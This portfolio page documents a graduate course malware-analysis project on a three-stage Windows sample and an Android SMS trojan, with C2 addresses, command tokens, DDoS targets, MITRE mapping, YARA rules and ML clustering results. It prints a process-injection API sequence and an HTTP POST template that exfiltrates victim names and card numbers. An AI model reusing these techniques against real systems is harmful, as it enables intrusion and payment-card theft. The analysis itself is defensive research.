<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="keywords" content="Malware Analysis, Reverse Engineering, Incident Response, Static Analysis, Dynamic Analysis, CS 6262">
    <title>Malware Analysis Project - Mason Kim</title>
    <link rel="stylesheet" href="../styles.css">
    <link rel="stylesheet" href="project-details.css">
</head>
<body class="dark-theme">
    <nav class="navbar">
        <div class="nav-content">
            <a href="../index.html" class="nav-brand">Mason Kim</a>
            <div class="nav-links">
                <a href="../index.html#about">About</a>
                <a href="../index.html#experience">Experience</a>
                <a href="../index.html#projects">Projects</a>
                <a href="../index.html#contact">Contact</a>
            </div>
        </div>
    </nav>

    <main class="project-detail">
        <header class="project-header">
            <div class="container">
                <h1>Malware Analysis</h1>
                <div class="project-meta">
                    <span class="project-period">CS 6262 – Project 3</span>
                    <span class="project-status">Completed</span>
                </div>
                <div class="project-tags">
                    <span class="tech-tag">Malware Analysis</span>
                    <span class="tech-tag">Reverse Engineering</span>
                    <span class="tech-tag">Incident Response</span>
                    <span class="tech-tag">Static Analysis</span>
                    <span class="tech-tag">Dynamic Analysis</span>
                    <span class="tech-tag">Android</span>
                </div>
            </div>
        </header>

        <section class="project-content container">
            <div class="tldr">
                <h2>TL;DR</h2>
                <ul>
                    <li><strong>Commands recovered</strong>: 9 C2 tokens via bounded symbolic execution (angr).</li>
                    <li><strong>Staging & stealth</strong>: 3‑stage injection lineage into <code>iexplore.exe</code>/<code>mspaint.exe</code>.</li>
                    <li><strong>Threat actions</strong>: Exfil path <code>/drupal/read.php</code>, DDoS target set (6 domains).</li>
                    <li><strong>ML results</strong>: CS6035 behavior clustering at ~0.70 F1, 0 rejected subjects.</li>
                </ul>
                <p><a href="../docs/malware-analysis-onepager.pdf" target="_blank" rel="noopener">One‑pager PDF (executive summary)</a></p>
            </div>
            <div class="project-abstract">
                <h2>Abstract</h2>
                <p>
                    This project presents a controlled, end-to-end analysis of a three‑stage Windows malware family and an Android SMS trojan conducted as part of graduate coursework at Georgia Tech. We unify static reverse engineering (disassembly, decompilation, symbolic execution) with dynamic observation in instrumented sandboxes and a researcher‑controlled C2 emulation harness. The study reconstructs command‑and‑control (C2) protocols, command vocabularies, and staging logic; validates behaviors through safe replay; and distills indicators of compromise (IOCs) and timelines to support incident response.
                </p>
                <h3>Key Contributions</h3>
                <ul>
                    <li>Protocol and instruction‑set reconstruction across multi‑stage Windows samples using symbolic execution to surface dormant code paths.</li>
                    <li>End‑to‑end staging map (dropper → loader → payload) with process‑injection lineage and persistence anchors.</li>
                    <li>Researcher‑controlled traffic redirection and C2 emulation enabling safe, reproducible behavior elicitation.</li>
                    <li>Behavioral malware clustering/classification (Malheur) achieving ~0.70 F1 on a held‑out set without rejections in CS6035 extension work.</li>
                    <li>Actionable IOC tables and remediation guidance for defenders (YARA/Sigma, endpoint/network controls).</li>
                </ul>
                <p class="note">Keywords: malware analysis, reverse engineering, symbolic execution, C2 emulation, behavioral clustering, Android SMS trojan.</p>
            </div>
            <div class="project-overview">
                <h2>Project Overview</h2>
                <p>
                    As part of Georgia Tech CS6262, this work dissects a three‑stage Windows malware lineage and a companion Android SMS trojan. We integrate rigorous static techniques with safe, instrumented execution to recover and validate the malware’s <strong>C2 infrastructure, command grammar, staging pipeline, and operator intents</strong>.
                </p>
                <p>
                    All executions occur in an isolated virtualization lab that deterministically redirects outbound traffic to local C2 emulators. Targeted symbolic execution (angr) reveals latent branches and obfuscated command tokens, enabling comprehensive behavior elicitation without contacting live infrastructure.
                </p>
            </div>

            <div class="project-objectives">
                <h2>Objectives &amp; Scope</h2>
                <ul>
                    <li>Derive C2 endpoints, protocol formats, and instruction sets from opaque binaries.</li>
                    <li>Trace multi‑stage payload deployment across Windows processes and Android components.</li>
                    <li>Identify anti‑analysis and persistence techniques such as process injection and emulator checks.</li>
                    <li>Produce reproducible IOC tables and attack timelines for defenders.</li>
                </ul>
            </div>

            <div class="project-mitre">
                <h2>MITRE ATT&amp;CK Mapping</h2>
                <h3>Enterprise (Windows)</h3>
                <ul>
                    <li><strong>T1055 Process Injection</strong>: Remote thread creation into <code>iexplore.exe</code>/<code>mspaint.exe</code>.</li>
                    <li><strong>T1071.001 Application Layer Protocol: Web Protocols</strong>: HTTP‑based C2 to <code>netscan/canof/vcs</code>.</li>
                    <li><strong>T1041 Exfiltration Over C2 Channel</strong>: HTTP POST to <code>/drupal/read.php</code>.</li>
                    <li><strong>T1498.001 Network DoS: Direct Network Flood</strong>: Multi‑target DDoS routine.</li>
                    <li><strong>T1105 Ingress Tool Transfer</strong>: Stage‑to‑stage payload retrieval over HTTP.</li>
                </ul>
                <h3>Mobile (Android)</h3>
                <ul>
                    <li><strong>SMS‑based C2</strong>: Covert commands via <code>SMS_RECEIVED</code> BroadcastReceiver.</li>
                    <li><strong>Access/Exfiltrate SMS/Device Info</strong>: HTTP exfil to lab C2 endpoints.</li>
                    <li><strong>Premium SMS Impact</strong>: Fraudulent SMS to <code>666546</code>.</li>
                    <li><strong>Emulator/Environment Checks</strong>: <code>TelephonyManager</code> null checks to gate behaviors.</li>
                </ul>
            </div>

            <div class="project-environment">
                <h2>Environment &amp; Tools</h2>
                <h3>Virtualization</h3>
                <ul>
                    <li>VirtualBox: Ubuntu host with isolated Windows&nbsp;XP and Android 4.4 guests; host‑only adapters rerouted outbound traffic to local C2 simulators.</li>
                    <li>iptables NAT rules redirected hard‑coded C2 IPs to <code>192.168.133.1</code>, e.g. <code>iptables -t nat -A PREROUTING -d 128.61.240.66 -j DNAT --to-destination 192.168.133.1</code>.</li>
                </ul>
                <figure class="diagram">
                  <pre class="mermaid">
graph LR
  Host[Host OS] -->|Host-only NIC| WinXP[Windows XP VM]
  Host -->|ADB over TCP| Android[Android VM]
  WinXP -->|HTTP| C2[Fake C2 192.168.133.1]
                  </pre>
                  <figcaption>Virtualized analysis network.</figcaption>
                </figure>
                
                <h3>Static Analysis</h3>
                <ul>
                    <li>Ghidra &amp; IDA Pro for disassembly, decompilation, and CFG generation.</li>
                    <li>radare2 and <code>strings</code> for API and network artifact hunting.</li>
                    <li>Custom <code>score.h</code> weighting to prioritize network-centric routines during CFG review.</li>
                    <li>Jadx/ApkTool for Android APK decompilation.</li>
                </ul>
                <h3>Dynamic Analysis</h3>
                <ul>
                    <li>Wireshark and iptables to capture and redirect HTTP traffic.</li>
                    <li>Cuckoo Sandbox and Android emulator for behavioral monitoring.</li>
                </ul>
                <h3>Specialized Utilities</h3>
                <ul>
                    <li>angr‑based symbolic execution to recover hidden command strings.</li>
                    <li><code>linux_sym_exec.py</code> harness automated command extraction across multiple functions.</li>
                    <li>Custom PHP C2 server to queue researcher‑defined instructions.</li>
                </ul>
                <figure class="diagram">
                  <pre class="mermaid">
flowchart LR
  A[Stage1.exe] --> B[Stage2.exe]
  B --> C[Payload.exe]
  C --> D{Actions}
  D -->|Exfiltration| E[Credit Card Dump]
  D -->|DDoS| F[Target List]
                  </pre>
                  <figcaption>Windows malware stage execution chain.</figcaption>
                </figure>
            </div>

            <div class="project-ethics">
                <h2>Threat Model, Safety &amp; Research Ethics</h2>
                <ul>
                    <li><strong>Network containment:</strong> Host‑only adapters and NAT rules ensure all egress is redirected to non‑routable, researcher‑controlled services. No traffic reaches the public Internet.</li>
                    <li><strong>Scope limitation:</strong> Analyses focus on behavior characterization and defensive IOCs; no offensive tooling is developed or released.</li>
                    <li><strong>Data handling:</strong> Potentially harmful binaries and artifacts remain quarantined in the lab; hashes and payloads are withheld from publication.</li>
                    <li><strong>Compliance:</strong> Procedures adhere to institutional policies and standard malware‑handling guidelines for academic research.</li>
                </ul>
            </div>

            <div class="project-methodology">
                <h2>Methodology</h2>
                <h3>Static Reverse Engineering</h3>
                <ul>
                    <li>Enumerated API imports and high‑entropy strings to triage network and persistence logic.</li>
                    <li>Generated CFGs for prioritized functions and targeted these with bounded symbolic execution.</li>
                    <li>Explored function <code>0x405190</code> with angr to recover <code>$download</code>, <code>$update</code>, and <code>$uninstall</code> command tokens.</li>
                </ul>
                <h3>Dynamic Execution</h3>
                <ul>
                    <li>Injected crafted commands via local C2 emulators; observed resultant process, file, registry, and network effects.</li>
                    <li>Monitored process injections and filesystem artifacts with ProcMon and Cuckoo; validated behaviors against static hypotheses.</li>
                </ul>
                <h3>Android Instrumentation</h3>
                <ul>
                    <li>Decompiled Smali to trace BroadcastReceiver callbacks and network routines.</li>
                    <li>Used <code>adb emu sms send</code> to trigger covert SMS commands.</li>
                </ul>
                <figure class="diagram">
                  <pre class="mermaid">
flowchart LR
  Code["Disassembly / CFG"] --> Symb["Symbolic Execution (angr)"]
  Symb --> Tokens["Recovered Command Tokens"]
  Tokens --> C2Emu["Local C2 Emulator"]
  C2Emu --> Dynamic["Controlled Dynamic Execution"]
  Dynamic --> Findings["Validated Behaviors and IOCs"]
  Findings --> Report["Reports and Detections"]
                  </pre>
                  <figcaption>End‑to‑end analysis method from static to dynamic validation.</figcaption>
                </figure>
            </div>

            <div class="project-reproducibility">
                <h2>Reproducibility</h2>
                <ul>
                    <li><strong>Virtualization:</strong> Create host‑only networks and apply deterministic DNAT rules to map hard‑coded C2 IPs to a local emulator (example shown below). Use fresh snapshots for each run.</li>
                    <li><strong>C2 emulation:</strong> Implement minimal HTTP endpoints that mirror expected paths and tokens; log all requests for analysis.</li>
                    <li><strong>Symbolic execution:</strong> Constrain search by seeding realistic environmental inputs and bounding path depth to mitigate path explosion.</li>
                    <li><strong>Sandboxing:</strong> Execute only within isolated VMs; block all outbound routes except host‑only interfaces.</li>
                </ul>
                <pre><code>iptables -t nat -A PREROUTING -d &lt;hardcoded_c2_ip&gt; -j DNAT --to-destination 192.168.133.1</code></pre>
                <p class="note">Exact binaries and hashes are withheld; the procedure above enables reproduction with institution‑approved samples.</p>
            </div>

            <div class="project-findings">
                <h2>Windows Malware: Stage Analysis</h2>
                <figure class="diagram">
                  <pre class="mermaid">
flowchart TD
  S1["Stage1.exe (Dropper)"] -->|$download| S2["Stage2.exe (Loader)"]
  S2 -->|download payload| P["Payload.exe"]
  P -->|$cardintervalcfae| Exfil[["HTTP POST /drupal/read.php"]]
  P -->|$launchddosfc25| DDoS{{"Multi-target DDoS"}}
  S1 -. inject .-> IE1["iexplore.exe"]
  S2 -. inject .-> IE2["iexplore.exe"]
  P  -. inject .-> MSP["mspaint.exe"]
                  </pre>
                  <figcaption>Stage relationships, commands, and injection lineage.</figcaption>
                </figure>
                <h3>Stage&nbsp;1 – Initial Dropper</h3>
                <ul>
                    <li>Injects into <code>iexplore.exe</code> via <code>CreateRemoteThread</code>/<code>WriteProcessMemory</code>.</li>
                    <li>C2: <code>128.61.240.66</code> (<code>netscan.gtisc.gatech.edu</code>).</li>
                    <li>Commands: <code>$download</code>, <code>$update</code>, <code>$uninstall</code>; <code>$download</code> retrieves Stage2 from <code>128.61.240.187</code>.</li>
                </ul>
                <h3>Stage&nbsp;2 – Downloader/Loader</h3>
                <ul>
                    <li>Again injects into <code>iexplore.exe</code>; contacts <code>143.215.130.19</code> (<code>canof.gtisc.gatech.edu</code>).</li>
                    <li>Obfuscated commands <code>$D0wNI0Ada5e2</code>, <code>$uPdAtea4cf</code>, <code>$Un1N5tAli</code> control payload retrieval and self‑management.</li>
                    <li>HTTP beacon path: <code>http://canof.gtisc.gatech.edu/users/login.php</code>.</li>
                </ul>
                <h3>Stage&nbsp;3 – Payload</h3>
                <ul>
                    <li>Hides within <code>mspaint.exe</code>; C2 at <code>143.215.130.79</code> (<code>vcs.gtisc.gatech.edu/server/operate.php</code>).</li>
                    <li>Commands: <code>$connection63e6</code> (connectivity check), <code>$cardintervalcfae</code> (credit‑card exfil to <code>/drupal/read.php</code>), <code>$launchddosfc25</code> (multi‑target DDoS).</li>
                    <li>Embedded target list includes <code>web-plesk5.gatech.edu</code>, <code>netscan.gtisc.gatech.edu</code> and other academic hosts.</li>
                </ul>
                <table class="ioc-table">
                    <thead>
                        <tr><th>Stage</th><th>Injected Process</th><th>C2 Endpoint</th><th>Commands</th></tr>
                    </thead>
                    <tbody>
                        <tr><td>Stage&nbsp;1</td><td>iexplore.exe</td><td>128.61.240.66</td><td>$download, $update, $uninstall</td></tr>
                        <tr><td>Stage&nbsp;2</td><td>iexplore.exe</td><td>143.215.130.19</td><td>$D0wNI0Ada5e2, $uPdAtea4cf, $Un1N5tAli</td></tr>
                        <tr><td>Payload</td><td>mspaint.exe</td><td>143.215.130.79</td><td>$connection63e6, $cardintervalcfae, $launchddosfc25</td></tr>
                    </tbody>
                </table>
            </div>
            <div class="project-deep-dive">
                <h2>Technical Deep Dive — Windows Internals</h2>
                <figure class="diagram">
                  <pre class="mermaid">
sequenceDiagram
  participant Analyst
  participant IE as iexplore.exe
  participant MSP as mspaint.exe
  Analyst->>IE: OpenProcess
  Analyst->>IE: VirtualAllocEx
  Analyst->>IE: WriteProcessMemory
  Analyst->>IE: CreateRemoteThread
  Note over IE: Stage1/Stage2 runtime
  Analyst->>MSP: OpenProcess / WriteProcessMemory / CreateRemoteThread
  Note over MSP: Payload runtime
                  </pre>
                  <figcaption>Injection primitives observed across stages.</figcaption>
                </figure>
                <h3>Process Injection Mechanics</h3>
                <ol>
                    <li>Attach to target process (e.g., <code>iexplore.exe</code>) via <code>OpenProcess</code>.</li>
                    <li>Allocate and write payload using <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>.</li>
                    <li>Start remote execution with <code>CreateRemoteThread</code> (or <code>QueueUserAPC</code>).</li>
                </ol>
                <p class="note">Stage transitions persist within benign host processes, reducing detection surface.</p>

                <h3>C2 Protocol Observations</h3>
                <ul>
                    <li>Stage&nbsp;1: <code>http://netscan.gtisc.gatech.edu</code> (<code>128.61.240.66</code>) with Stage&nbsp;2 fetch from <code>128.61.240.187</code>.</li>
                    <li>Stage&nbsp;2: <code>http://canof.gtisc.gatech.edu/users/login.php</code> (<code>143.215.130.19</code>).</li>
                    <li>Stage&nbsp;3: <code>http://vcs.gtisc.gatech.edu/server/operate.php</code> (<code>143.215.130.79</code>).</li>
                </ul>

                <h3>Exfiltration Payload Format</h3>
                <pre><code>POST /drupal/read.php HTTP/1.1
Host: netscan.gtisc.gatech.edu
Content-Type: application/x-www-form-urlencoded

INFO=&lt;victim_name&gt;&amp;CARD=&lt;card_number_masked&gt;
</code></pre>

                <h3>DDoS Target Set</h3>
                <ul>
                    <li><code>apache2-jolly.fairview.dreamhost.com</code></li>
                    <li><code>web-plesk5.gatech.edu</code></li>
                    <li><code>wenkewww.gtisc.gatech.edu</code></li>
                    <li><code>scouter.cc.gatech.edu</code></li>
                    <li><code>web-plesk9.gatech.edu</code></li>
                    <li><code>netscan.gtisc.gatech.edu</code></li>
                </ul>

                <h3>Symbolic Execution (angr)</h3>
                <ul>
                    <li>Target function: <code>0x405190</code> (command parser).</li>
                    <li>Constraints: bounded depth; seeded argv/memory to drive into parsing logic.</li>
                    <li>Recovered tokens: <code>$download</code>, <code>$update</code>, <code>$uninstall</code>.</li>
                </ul>
            </div>

            <div class="project-findings">
                <h2>Android Malware: MaliciousMessenger</h2>
                <ul>
                    <li>BroadcastReceiver hijacks <code>SMS_RECEIVED</code> intents to parse covert commands.</li>
                    <li>Anti‑emulation: checks <code>TelephonyManager</code>; null implies sandbox or emulator.</li>
                    <li>Information theft: messages like “Is this Tim?” trigger HTTP exfiltration to <code>192.168.133.1:5000/reviews</code>.</li>
                    <li>Premium SMS fraud: sends texts to <code>666546</code> on attacker command.</li>
                </ul>
                <figure class="diagram">
                  <pre class="mermaid">
sequenceDiagram
  participant Attacker
  participant Phone
  participant C2
  participant Premium
  Attacker->>Phone: SMS "Is this Tim?"
  Phone->>C2: HTTP POST /reviews (device info)
  Attacker-->>Phone: SMS "pay"
  Phone->>Premium: SMS to 666546
                  </pre>
                  <figcaption>Android SMS trojan command flow.</figcaption>
                </figure>
            </div>
            <div class="project-deep-dive">
                <h2>Technical Deep Dive — Android Internals</h2>
                <figure class="diagram">
                  <pre class="mermaid">
flowchart LR
  SMS["Incoming SMS"] --> BR["BroadcastReceiver - IncomingSms.onReceive"]
  BR -->|parse covert text| Router{Command Router}
  Router -->|exfil| HTTP["HTTP POST /reviews"]
  Router -->|fraud| Premium["Send SMS: 666546"]
  Router -->|no-op| Idle["Emulator Detected"]
                  </pre>
                  <figcaption>Android command parsing and actions.</figcaption>
                </figure>
                <figure class="diagram">
                  <pre class="mermaid">
sequenceDiagram
  participant Analyst
  participant Emulator as "Android Emulator"
  Analyst->>Emulator: adb emu sms send "+18005551212" "Is this Tim?"
  Emulator->>App: Broadcast SMS_RECEIVED
  App->>C2: HTTP POST /reviews (device info)
                  </pre>
                  <figcaption>ADB trigger sequence to exercise SMS‑driven commands.</figcaption>
                </figure>
                <h3>Manifest &amp; Broadcast Flow</h3>
                <pre><code>&lt;receiver android:name=".IncomingSms"&gt;
    &lt;intent-filter&gt;
        &lt;action android:name="android.provider.Telephony.SMS_RECEIVED" /&gt;
    &lt;/intent-filter&gt;
&lt;/receiver&gt;
</code></pre>
                <ul>
                    <li>Entry point: <code>IncomingSms.onReceive()</code> parses SMS for covert triggers.</li>
                    <li>Permissions include SMS receive/send and Internet for HTTP exfiltration.</li>
                </ul>
                <h3>Anti‑Analysis Checks</h3>
                <ul>
                    <li><code>TelephonyManager</code> null checks to infer emulator/sandbox.</li>
                    <li>Optional device fingerprint gating (e.g., model) to suppress behavior under analysis.</li>
                </ul>
                <h3>Observed Endpoints</h3>
                <ul>
                    <li>Exfiltration: <code>http://192.168.133.1:5000/reviews</code>, <code>/customerService</code> (lab C2).</li>
                    <li>Premium SMS: <code>666546</code> (fraud trigger via <code>SmsManager</code>).</li>
                </ul>
            </div>

            <div class="project-findings">
                <h2>Key Indicators of Compromise</h2>
                <figure class="diagram">
                  <pre class="mermaid">
graph TD
  C2A["128.61.240.66 - netscan.gtisc.gatech.edu"]
  C2B["143.215.130.19 - canof.gtisc.gatech.edu"]
  C2C["143.215.130.79 - vcs.gtisc.gatech.edu"]
  EXF[http://.../drupal/read.php]
  D1[apache2-jolly.fairview.dreamhost.com]
  D2[web-plesk5.gatech.edu]
  D3[wenkewww.gtisc.gatech.edu]
  D4[scouter.cc.gatech.edu]
  D5[web-plesk9.gatech.edu]
  D6[netscan.gtisc.gatech.edu]
  C2C --> EXF
  C2C --> D1
  C2C --> D2
  C2C --> D3
  C2C --> D4
  C2C --> D5
  C2C --> D6
                  </pre>
                  <figcaption>Key IOCs and relationships.</figcaption>
                </figure>
                <ul>
                    <li>C2 IPs: <code>128.61.240.66</code>, <code>128.61.240.187</code>, <code>143.215.130.19</code>, <code>143.215.130.79</code>.</li>
                    <li>Injected processes: <code>iexplore.exe</code>, <code>mspaint.exe</code>.</li>
                    <li>DDoS targets: <code>apache2-jolly.fairview.dreamhost.com</code>, <code>web-plesk5.gatech.edu</code>, <code>wenkewww.gtisc.gatech.edu</code>, <code>scouter.cc.gatech.edu</code>, <code>web-plesk9.gatech.edu</code>, <code>netscan.gtisc.gatech.edu</code>.</li>
                    <li>Windows exfil path: <code>http://netscan.gtisc.gatech.edu/drupal/read.php</code> (URL‑encoded parameters).</li>
                    <li>Android premium number: <code>666546</code>.</li>
                </ul>
            </div>

            <div class="project-remediation">
                <h2>Remediation &amp; Recommendations</h2>
                <ul>
                    <li>Publish YARA/Sigma signatures for embedded command strings and hard‑coded C2 URLs; blocklist recovered endpoints and monitor for injection via Sysmon.</li>
                    <li>Instrument SMS gateways to detect covert command patterns and premium‑number abuse.</li>
                    <li>Segment analysis networks and use host‑only adapters to contain malware traffic.</li>
                </ul>
            </div>

            <div class="project-discussion">
                <h2>Discussion</h2>
                <figure class="diagram">
                  <pre class="mermaid">
flowchart LR
  W[Windows Multi-stage] -->|Process Injection| Stealth[Stealth]
  W -->|C2-gated| Control[Operator Control]
  A[Android SMS Trojan] -->|Covert SMS| Control
  A -->|Emulator Checks| Stealth
  Stealth --> Limits[Dynamic Analysis Limits]
  Control --> Def[Defender Strategy: Sinkhole/Emulate]
                  </pre>
                  <figcaption>Tradecraft and defender strategy mapping.</figcaption>
                </figure>
                <ul>
                    <li><strong>Windows vs Android tradecraft:</strong> Windows samples leverage multi‑stage stealth and C2‑gated activation; Android uses covert SMS triggers and emulator checks.</li>
                    <li><strong>Methodological limits:</strong> Dynamic traces are noisy/incomplete; symbolic execution mitigates obfuscation but must be bounded to avoid path explosion.</li>
                    <li><strong>Defensive levers:</strong> Sinkholing, protocol emulation, and host telemetry (remote thread creation into <code>iexplore.exe</code>/<code>mspaint.exe</code>) are high‑signal controls.</li>
                </ul>
                <h3>Quantitative Results</h3>
                <table class="ioc-table">
                    <thead>
                        <tr><th>Area</th><th>Metric</th><th>Result</th></tr>
                    </thead>
                    <tbody>
                        <tr><td>Windows RE</td><td>Recovered C2 commands</td><td><span id="metric-commands-recovered">Pending</span></td></tr>
                        <tr><td>Windows RE</td><td>Static coverage (functions/paths)</td><td><span id="metric-static-coverage">Pending</span></td></tr>
                        <tr><td>Windows RE</td><td>Activated behaviors via C2 emu</td><td><span id="metric-activated-behaviors">Pending</span></td></tr>
                        <tr><td>Detection</td><td>True Positive Rate (TPR)</td><td><span id="metric-detection-tpr">Pending</span></td></tr>
                        <tr><td>Detection</td><td>False Positive Rate (FPR)</td><td><span id="metric-detection-fpr">Pending</span></td></tr>
                        <tr><td>ML (CS6035)</td><td>F1 on test</td><td><span id="metric-ml-f1">Pending</span></td></tr>
                        <tr><td>ML (CS6035)</td><td>Rejected subjects</td><td><span id="metric-ml-rejected">Pending</span></td></tr>
                    </tbody>
                </table>
                <p class="note">Metrics are auto-populated from a JSON file to preserve reproducibility and avoid manual edits.</p>
                <h3>Metrics Update (JSON Schema)</h3>
                <pre><code>{
  "commandsRecovered": 9,
  "activatedBehaviors": ["exfiltration", "ddos", "connectivity"],
  "staticCoverage": null,               // e.g., "42/120 functions" or a percentage
  "dynamicCoverage": null,              // optional: e.g., branches hit
  "detectionEvaluation": {
    "tp": null, "fp": null, "tn": null, "fn": null,
    "tpr": null,                        // optional; computed if tp/fn present
    "fpr": null                         // optional; computed if fp/tn present
  },
  "ml": { "f1": 0.70, "rejectedSubjects": 0 }
}
// Save as assets/metrics/malware-analysis.json
                </code></pre>
                <h3>Related Work (Brief)</h3>
                <table class="ioc-table">
                    <thead>
                        <tr><th>Work/Tool</th><th>Focus</th><th>Difference vs. This Project</th></tr>
                    </thead>
                    <tbody>
                        <tr><td>Ghidra/IDA Analyses</td><td>Static RE</td><td>We couple with angr and C2 emulation for full behavior activation</td></tr>
                        <tr><td>Cuckoo Sandbox</td><td>Dynamic behavior capture</td><td>We redirect/simulate C2 to avoid dormancy and force activation</td></tr>
                        <tr><td>Malheur</td><td>Behavior clustering</td><td>We document end‑to‑end pipeline with subject classification (0 rejected)</td></tr>
                    </tbody>
                </table>
            </div>

            <div class="project-lessons">
                <h2>Challenges &amp; Lessons Learned</h2>
                <ul>
                    <li>Symbolic execution bypassed obfuscated checks but required careful state pruning to avoid path explosion.</li>
                    <li>C2‑dependent logic necessitated reliable traffic‑redirect infrastructure.</li>
                </ul>
            </div>

            <div class="project-future">
                <h2>Future Work</h2>
                <ul>
                    <li>Apply the methodology to cloud‑native malware and kernel drivers.</li>
                    <li>Automate Android command inference using differential fuzzing of BroadcastReceivers.</li>
                </ul>
            </div>

            <section id="cs6035-malware-analysis" class="section">
                <h2>CS6035 Malware Analysis Project — Behavioral Analysis & Malware Clustering</h2>

                <p class="lead">
                    This graduate project extends my prior malware work by combining <strong>dynamic sandbox analysis</strong> (Phase&nbsp;1) with <strong>machine-learning–based clustering and classification</strong> (Phase&nbsp;2). It demonstrates end-to-end skills from safe execution and behavior labeling to feature engineering, hierarchical clustering, and F1‑based evaluation.
                </p>

                <h3>Overview of the Two-Phase Structure</h3>
                <p>
                    In <strong>Phase 1</strong>, I performed <em>behavioral malware analysis</em> using Joe&nbsp;Sandbox Cloud, focusing on runtime actions (file/registry modifications, network beacons, process injection). In <strong>Phase 2</strong>, I used <em>Malheur</em> to cluster thousands of sandbox behavior traces and classify new samples by family, targeting a <strong>≥ 70% F1‑score</strong> on a held‑out test set.
                </p>

                <figure class="diagram">
                  <pre class="mermaid">
flowchart LR
  A["Malware Samples"] --> B["Joe Sandbox Cloud (Dynamic Analysis)"]
  B --> C["Behavior Reports"]
  C --> D["Analyst Labels (Phase 1)"]
  C --> E["Extract API Call Sequences for ML Features"]
  E --> F["Malheur Clustering (Phase 2 Training)"]
  F --> G["Malheur Classification (Phase 2 Testing)"]
  G --> H["Trained Model (>= 70% F1)"]
  H --> I["Classify New Malware Samples"]
                  </pre>
                  <figcaption>CS6035 end‑to‑end pipeline.</figcaption>
                </figure>

                <h3>Phase 1 — Behavioral Malware Analysis (Joe Sandbox Cloud)</h3>
                <h4>Background & Goals</h4>
                <p>
                    Five real‑world samples were analyzed via Joe Sandbox reports to identify behaviors such as file drops, registry persistence, network communication, and potential keylogging/anti‑VM traits. The deliverable was a behavior label set per sample across ~20 categories.
                </p>

                <h4>Tools & Dataset</h4>
                <ul>
                    <li>JoeSandboxCloud reports (process/API call traces, created files, registry/network activity, signatures)</li>
                    <li>Analyst checklist for behavior questions (e.g., autostart keys, HTTP without user‑agent, keylogging attempts)</li>
                </ul>

                <h4>Methodology</h4>
                <ul>
                    <li>Read <em>Behavior/Processes</em>, <em>Created Files</em>, <em>Registry</em>, <em>Network</em>, and <em>Signatures</em> sections.</li>
                    <li>Correlate signatures (e.g., sandbox evasion, keylogger) with raw API traces for confirmation.</li>
                    <li>Count behaviors as “attempted” if invoked by any spawned process, even if OS denied them.</li>
                </ul>

                <h4>Observations & Results</h4>
                <ul>
                    <li>Multiple samples dropped executables/DLLs; registry <code>Run</code> keys used for persistence.</li>
                    <li>Network beacons included HTTP GETs with missing user‑agent; DNS lookups and socket ops observed.</li>
                    <li>Keylogging indicators via low‑level keyboard/clipboard APIs; anti‑VM/environment checks present.</li>
                </ul>

                <h4>Limitations & Challenges</h4>
                <ul>
                    <li>Information overload in long traces—relied on filtering/keyword search and sequence context.</li>
                    <li>Runtime‑only vantage point: behaviors not triggered in sandbox remain unseen.</li>
                </ul>

                <h3>Phase 2 — Malware Clustering & Classification (Malheur)</h3>
                <h4>Background & Goals</h4>
                <p>
                    Using Malheur, I clustered behavior sequences (event streams of API calls) to discover families and then classified hold‑out/test samples, targeting ≥ 0.70 F1 on the test set and zero rejected subjects (<code>classify.max_dist=1.0</code>).
                </p>

                <h4>Tools, Data & Config</h4>
                <ul>
                    <li><strong>Data:</strong> &gt;11k training feature files and a separate testing set; each file encodes a semicolon‑separated API call sequence.</li>
                    <li><strong>Labels:</strong> Ground truth via AVClass/VirusTotal family tags embedded as pseudo file extensions (e.g., <code>.dinwod</code>).</li>
                    <li><strong>Key params:</strong> <code>ngram_len</code> for sequential context; <code>classify.max_dist=1.0</code> to avoid “rejected”.</li>
                </ul>

                <h4>Methodology</h4>
                <ul>
                    <li><em>Vectorization:</em> map event sequences to n‑gram feature vectors.</li>
                    <li><em>Training:</em> hierarchical/agglomerative clustering → cluster prototypes.</li>
                    <li><em>Tuning:</em> iterate <code>ngram_len</code>/distance settings to balance precision vs. recall.</li>
                    <li><em>Testing:</em> nearest‑prototype classification on the test set; compute precision/recall/F1.</li>
                    <li><em>Subjects:</em> classify Phase‑1 samples; ensure none are rejected.</li>
                </ul>

                <h4>Implementation Notes</h4>
                <pre><code># Cluster (training)
malheur -vv cluster --config config.mlw --input dataset/training --output out/train

# Classify (testing)
malheur -vv classify --config config.mlw --input dataset/testing --model out/train --output out/test

# Classify subjects (Phase 1 samples)
malheur -vv classify --config config.mlw --input dataset/subjects --model out/train --output out/subjects
</code></pre>

                <figure class="diagram">
                  <pre class="mermaid">
flowchart TD
  subgraph Training
    A["Training Feature Files\n(API sequences)"] --> B["Vectorization (n-grams)"]
    B --> C["Hierarchical Clustering"]
    C --> D{{"Clusters"}}
    D --> E["Cluster Prototypes (Model)"]
    D --> F[["Evaluate Precision / Recall / F1"]]
  end
  subgraph Testing
    G["Testing Feature Files"] --> H["Vectorization"]
    H --> I["Assign to Nearest Prototype"]
    I --> J[["Classification Results"]]
    J --> K[["Compute F1 on Test Set"]]
  end
                  </pre>
                  <figcaption>Malheur training & classification flow.</figcaption>
                </figure>

                <h4>Results</h4>
                <ul>
                    <li>Achieved <strong>~0.70 F1</strong> on the test set; all subject samples classified (no “rejected”).</li>
                    <li>High‑purity clusters aligned with known families (e.g., Dinwod, Mirai‑like network behavior).</li>
                </ul>

                <h4>Limitations & Challenges</h4>
                <ul>
                    <li>Family overlap in common behaviors; need sequential context (n‑grams) to disambiguate.</li>
                    <li>High‑dimensional feature space; clustering at scale requires careful parameter choices.</li>
                    <li>Label noise from AV aggregation; interpret cluster IDs with threat‑intel cross‑checks.</li>
                </ul>

                <h3>Key Security Skills Demonstrated</h3>
                <ul class="skills">
                    <li>Sandboxed malware execution & behavior triage</li>
                    <li>Behavior labeling & indicator extraction</li>
                    <li>Feature engineering on event sequences (n‑grams)</li>
                    <li>Unsupervised learning (hierarchical clustering)</li>
                    <li>Model evaluation (precision/recall/F1)</li>
                    <li>Scripting & automation for iterative tuning</li>
                </ul>

                <p class="note">This section complements my earlier CS6262 analysis by adding a scalable, ML‑driven approach to family discovery and classification.</p>
            </section>
            <div class="project-detections">
                <h2>Detection Artifacts (Examples)</h2>
                <p>Below are example rules and validation snippets. Test data is synthetic and safe.</p>
                <h3>YARA</h3>
                <pre><code>rule Win_MultiStage_C2_Strings {
    meta:
        author = "Mason Kim"
        context = "CS6262 Project"
    strings:
        $cmd1 = "$download"
        $cmd2 = "$uPdAtea4cf"
